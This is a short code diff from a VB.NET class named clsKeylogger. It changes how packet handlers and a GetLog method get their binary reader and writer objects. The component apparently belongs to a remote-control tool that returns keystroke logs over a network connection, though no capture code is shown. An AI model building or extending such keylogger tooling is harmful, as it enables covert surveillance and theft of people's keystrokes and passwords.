@@ -19,8 +19,8 @@ Public Class clsKeylogger
 
     Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
         Dim ID As Byte = packet(0)
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten()
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
 
         If ID = 0 Then
 
@@ -49,7 +49,7 @@ Public Class clsKeylogger
     End Sub
 
     Public Sub GetLog()
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = New Byte() {}
 
         BinWriter.BufferAddByte(packet, 0)
